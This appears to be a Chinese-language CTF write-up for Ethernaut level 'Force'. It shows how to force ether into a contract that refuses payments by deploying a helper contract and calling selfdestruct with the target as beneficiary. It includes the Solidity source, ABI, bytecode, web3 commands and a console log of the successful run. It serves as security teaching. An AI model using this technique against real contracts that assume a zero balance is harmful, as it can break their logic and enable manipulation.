

# 08 Force

## 思路

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

目标: 成功向合约转账

题目中的是一个空合约, 没有`receive() external payable{}  `

~~也没有`fallback () exteranl payable{}`~~    不!!!!   是有`fallback () exteranl payable{}`的, 这是默认的, 合约都有.

但其是这样的(可以通过反编译合约进行查看)

```solidity
fallback () exteranl payable{
	revert();
}
```

所以正常思路下, 该合约是不能接收eth的. 除非`有一个合约以死相逼`

 >`selfdestruct(address payable recipient)`是一个用于删除智能合约的特殊函数，它可以用来实现以下功能：
 >
 >将智能合约从以太坊网络上删除。删除智能合约后，智能合约占用的存储空间和计算资源就会被释放。
 >将智能合约上的资金转移到指定的地址。您可以在调用selfdestruct函数时指定一个地址，在智能合约被删除之前，它上面的资金会被转移到指定的地址。



所以: 新建一个合约, 该合约中存一些eth. 然后该合约进行`自毁`, 并将受益人指定为题目中的合约地址, 题目中的合约地址只能被迫接受.



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyContract {

    address public owner;
    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }
    receive() external payable{}

    function destroy (address payable _beneficiary) public onlyOwner{
        selfdestruct(_beneficiary);
    }
}
```



```
solc --abi --bin ./MyContract.sol
```






```solidity

const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address payable","name":"_beneficiary","type":"address"}],"name":"destroy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]

const byteCode = "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102fc806100606000396000f3fe60806040526004361061002c5760003560e01c8062f55d9d146100385780638da5cb5b1461006157610033565b3661003357005b600080fd5b34801561004457600080fd5b5061005f600480360381019061005a91906101ba565b61008c565b005b34801561006d57600080fd5b50610076610133565b6040516100839190610208565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461011a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610111906102a6565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101878261015c565b9050919050565b6101978161017c565b81146101a257600080fd5b50565b6000813590506101b48161018e565b92915050565b6000602082840312156101d0576101cf610157565b5b60006101de848285016101a5565b91505092915050565b60006101f28261015c565b9050919050565b610202816101e7565b82525050565b600060208201905061021d60008301846101f9565b92915050565b600082825260208201905092915050565b7f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f60008201527f6e2e000000000000000000000000000000000000000000000000000000000000602082015250565b6000610290602283610223565b915061029b82610234565b604082019050919050565b600060208201905081810360008301526102bf81610283565b905091905056fea26469706673582212204d90905801020ead86cac7432b5447903b664d45e1e1669b2ba36bb79e2ee5e764736f6c634300080f0033"

const myContract = new web3.eth.Contract(abi);
const deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
const myInstance = await deploy.send({
	from: player,
	gas: 1500000,
	gasPrice: '30000000000000',
});

//向合约中存一些eth
await web3.eth.sendTransaction({
	from:player,
	to: myInstance.options.address,
	value: 100000
});

//合约自毁, 并将eth转移给题目中的合约地址
await myInstance.methods.destroy(instance).send({from: player});
await web3.eth.getBalance(instance);


```



## 知识点

并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 `address(this).balance == 0` 之上.



## 参考答案

```
^^.js:35 => Current network: local
redux-logger.js:1  action SET_NETWORK_ID @ 16:12:24.893
redux-logger.js:1  action LOAD_GAME_DATA @ 16:12:24.894
redux-logger.js:1  action CONNECT_WEB3 @ 16:12:25.471
^^.js:35 => 玩家地址0x4A5344Fd7762E233A30971DEaE3bEEdde3786f6D
redux-logger.js:1  action SET_PLAYER_ADDRESS @ 16:12:25.480
redux-logger.js:1  action LOAD_ETHERNAUT_CONTRACT @ 16:12:25.482
redux-logger.js:1  action SET_GAS_PRICE @ 16:12:25.533
redux-logger.js:1  action SET_BLOCK_NUM @ 16:12:25.534
setNetwork.js:83 id:1670399205952, all id:5,420,1337,80001,421613,11155111
^^.js:35 => Current network: local
redux-logger.js:1  action SET_NETWORK_ID @ 16:12:25.538
^^.js:35 => 以太坊地址0xe17E0a7Cea6BF3Fa392569FbD32E5d2D7CA5A6E0
redux-logger.js:1  action SYNC_PLAYER_PROGRESS @ 16:12:25.558
^^.js:56 Force
^^.js:113 输入 help() 获得web3加载项
^^.js:35 => 实例地址0xDe2C305F10b5b35A9cCb47a2Ed3eC47930343A7B
redux-logger.js:1  action ACTIVATE_LEVEL @ 16:12:30.153
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:12:30.154
^^.js:35 => 关卡地址0xeE43a4f22913d5B59891909eECB6301eB75BA2c8
^^.js:45 (●*∩_∩*●) 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:12:36.594
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x3399954b773754bd8de496655c868b45ed6f58f8bf75c7129c4c5d4538471796
^^.js:35 => 实例地址0x524a395c0D73C07862d11Df67283b02e5AE9675B
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:12:43.161
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x3399954b773754bd8de496655c868b45ed6f58f8bf75c7129c4c5d4538471796
redux-logger.js:1  action SET_BLOCK_NUM @ 16:12:45.500
const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address payable","name":"_beneficiary","type":"address"}],"name":"destroy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]

const byteCode = "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102fc806100606000396000f3fe60806040526004361061002c5760003560e01c8062f55d9d146100385780638da5cb5b1461006157610033565b3661003357005b600080fd5b34801561004457600080fd5b5061005f600480360381019061005a91906101ba565b61008c565b005b34801561006d57600080fd5b50610076610133565b6040516100839190610208565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461011a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610111906102a6565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101878261015c565b9050919050565b6101978161017c565b81146101a257600080fd5b50565b6000813590506101b48161018e565b92915050565b6000602082840312156101d0576101cf610157565b5b60006101de848285016101a5565b91505092915050565b60006101f28261015c565b9050919050565b610202816101e7565b82525050565b600060208201905061021d60008301846101f9565b92915050565b600082825260208201905092915050565b7f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f60008201527f6e2e000000000000000000000000000000000000000000000000000000000000602082015250565b6000610290602283610223565b915061029b82610234565b604082019050919050565b600060208201905081810360008301526102bf81610283565b905091905056fea26469706673582212204d90905801020ead86cac7432b5447903b664d45e1e1669b2ba36bb79e2ee5e764736f6c634300080f0033"

const myContract = new web3.eth.Contract(abi);
const deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
const myInstance = await deploy.send({
	from: player,
	gas: 1500000,
	gasPrice: '30000000000000',
});

await web3.eth.sendTransaction({
	from:player,
	to: myInstance.options.address,
	value: 100000
});


await myInstance.methods.destroy(instance).send({ from: player});
await web3.eth.getBalance(instance);
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x56a4f1919aaf0ca0c6e406980f4887116aba86e9312ec36ee06368e3d4d61018
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x56a4f1919aaf0ca0c6e406980f4887116aba86e9312ec36ee06368e3d4d61018
redux-logger.js:1  action SET_BLOCK_NUM @ 16:12:55.523
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x69e8069d624acbfdf10e6185f9fee6c136c2e7d808f235ff3e319404e45e1b85
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x69e8069d624acbfdf10e6185f9fee6c136c2e7d808f235ff3e319404e45e1b85
redux-logger.js:1  action SET_BLOCK_NUM @ 16:13:05.500
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xdcf3edd4e2c2f4ef694fc3600d36181d268a390e94554fcae8e2e5bf38b59ceb
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xdcf3edd4e2c2f4ef694fc3600d36181d268a390e94554fcae8e2e5bf38b59ceb
"100000"
^^.js:45 【ツ】 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:13:08.867
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xbb75c32904c013cd5a7a8cc277fd3677fea1fa70ab2441f1b4fc751ba3bd55cf
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xbb75c32904c013cd5a7a8cc277fd3677fea1fa70ab2441f1b4fc751ba3bd55cf
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:73 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:13:15.499

```

